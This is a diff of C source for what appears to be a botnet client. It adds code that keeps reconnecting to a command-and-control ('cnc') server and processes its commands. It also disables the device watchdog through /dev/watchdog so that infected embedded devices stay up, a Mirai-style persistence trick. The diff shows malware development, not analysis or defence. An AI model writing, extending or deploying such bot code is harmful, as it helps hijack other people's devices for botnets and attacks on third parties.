@@ -8,6 +8,7 @@
 #include <unistd.h>
 
 #include <sys/time.h>
+#include <arpa/inet.h>
 #include <netinet/in.h>
 
 #include "xhdrs/includes.h"
@@ -38,19 +39,51 @@ static void sigexit(int signo)
 	init_exit();
 }
 
+static void sigsegv(int signo)
+{
+    printf("Got SIGSEGV");
+    init_exit();
+	_exit(EXIT_FAILURE);
+}
+
+static void init_signals(void)
+{
+    struct sigaction sa;
+    sigset_t ss;
+	
+	util_msgc("Info", "Debug mode active!");
+	
+    sigemptyset(&ss);
+    sa.sa_handler = sigexit;
+    sa.sa_mask = ss;
+    sa.sa_flags = 0;
+    sigaction(SIGINT, &sa, 0);
+	
+    sigemptyset(&ss);
+    sa.sa_handler = sigsegv;
+    sa.sa_mask = ss;
+    sa.sa_flags = 0;
+    sigaction(SIGSEGV, &sa, 0);
+	
+    sigemptyset(&ss);
+    sa.sa_handler = sigsegv;
+    sa.sa_mask = ss;
+    sa.sa_flags = 0;
+    sigaction(SIGBUS, &sa, 0);
+	
+	util_msgc("Info", "Initiated Signals!");
+}
+#else
 static void init_signals(void)
 {
     struct sigaction sa;
     sigset_t ss;
 	
     sigemptyset(&ss);
-	
-    sa.sa_handler = sigexit;
+    sa.sa_handler = SIG_IGN;
     sa.sa_mask = ss;
     sa.sa_flags = 0;
-    sigaction(SIGINT, &sa, 0);
-	
-	util_msgc("Info", "Initiated Signals!");
+    sigaction(SIGCHLD, &sa, 0);
 }
 #endif
 
@@ -99,12 +132,25 @@ static void init_uniq_id(void)
 
 int main(int argc, char *argv[])
 {
+	struct in_addr ip4;
+	
 	proc_startup = time(NULL);
-#ifdef DEBUG
 	init_signals();
-#endif
 	init_uniq_id();
-
+	
+	LOCAL_ADDR = net_local_addr();
+	
+#ifndef DEBUG
+	// Prevent watchdog from rebooting device
+	if((wfd = open("/dev/watchdog", 2)) != -1 ||
+		(wfd = open("/dev/misc/watchdog", 2)) != -1)
+	{
+        int one = 1;
+		ioctl(wfd, 0x80045704, &one);
+		close(wfd);
+	}
+#endif
+	
 	while(!exiting)
 	{	
 		while((sockfd = net_connect("localhost", "3448", IPPROTO_TCP)) <= 0)
@@ -116,6 +162,11 @@ int main(int argc, char *argv[])
 #endif
 			util_sleep(1);
 		}
+		
+#ifdef DEBUG
+		ip4.s_addr = LOCAL_ADDR;
+		util_msgc("Info", "Connected to cnc, local_addr = %s", inet_ntoa(ip4));
+#endif
 		
 		while(!exiting)
 		{
@@ -132,7 +183,7 @@ int main(int argc, char *argv[])
 				break;
 			}
 			
-			memset(pktbuf, 0, sizeof(pktbuf));
+			//memset(pktbuf, 0, sizeof(pktbuf));
 			
 			while(memset(pktbuf, 0, sizeof(pktbuf)) && 
 				(buflen = recv(sockfd, pktbuf, sizeof(pktbuf), 0)))
@@ -160,13 +211,6 @@ int main(int argc, char *argv[])
 						net_fdsend(sockfd, PONG, "");
 					break;
 					
-					case VERSION:
-#ifdef DEBUG
-						util_msgc("Info", "Version from cnc!");
-#endif
-						net_fdsend(sockfd, VERSION, VERSIONSTR);
-					break;
-					
 					case MESSAGE:
 #ifdef DEBUG
 						util_msgc("Info", "Message from cnc!");
@@ -177,6 +221,9 @@ int main(int argc, char *argv[])
 			} // While
 			sleep(1);
 		} // While
+#ifdef DEBUG
+		util_msgc("Info", "Lost connection to cnc!");
+#endif
 	} // While
 	
 	close(sockfd);
